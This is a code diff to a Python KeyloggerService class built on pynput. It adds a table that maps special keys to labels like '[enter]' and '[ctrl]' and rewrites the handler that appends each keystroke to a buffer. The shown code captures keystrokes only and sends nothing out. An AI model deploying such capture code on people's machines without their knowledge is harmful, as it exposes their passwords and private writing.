@@ -1,6 +1,31 @@
 from pynput import keyboard
 from threading import Lock
 
+SPECIAL_KEYS = {
+    keyboard.Key.space: " ",
+    keyboard.Key.enter: "[enter]\n",
+    keyboard.Key.tab: "[tab]",
+    keyboard.Key.backspace: "[backspace]",
+    keyboard.Key.delete: "[delete]",
+    keyboard.Key.esc: "[esc]",
+    keyboard.Key.shift: "[shift]",
+    keyboard.Key.shift_r: "[shift]",
+    keyboard.Key.ctrl: "[ctrl]",
+    keyboard.Key.ctrl_r: "[ctrl]",
+    keyboard.Key.alt: "[alt]",
+    keyboard.Key.alt_r: "[alt]",
+    keyboard.Key.cmd: "[cmd]",
+    keyboard.Key.cmd_r: "[cmd]",
+    keyboard.Key.up: "[up]",
+    keyboard.Key.down: "[down]",
+    keyboard.Key.left: "[left]",
+    keyboard.Key.right: "[right]",
+    keyboard.Key.home: "[home]",
+    keyboard.Key.end: "[end]",
+    keyboard.Key.page_up: "[page_up]",
+    keyboard.Key.page_down: "[page_down]",
+}
+
 
 class KeyloggerService:
 
@@ -53,24 +78,21 @@ class KeyloggerService:
 
         try:
 
-            if hasattr(key, "char") and key.char:
+            if isinstance(key, keyboard.KeyCode):
 
                 k = key.char
 
-            else:
-
-                k = ""
-
-        except AttributeError:
-
-            if hasattr(key, "name"):
-
-                k = f"[{key.name}]"
+                if k is None:
+                    return
 
             else:
 
-                k = ""
+                k = SPECIAL_KEYS.get(key, f"[{key.name}]")
 
-        with self._lock:
+            with self._lock:
 
-            self._buffer.append(k)
+                self._buffer.append(k)
+
+        except Exception as e:
+
+            print("Keylogger error:", e)
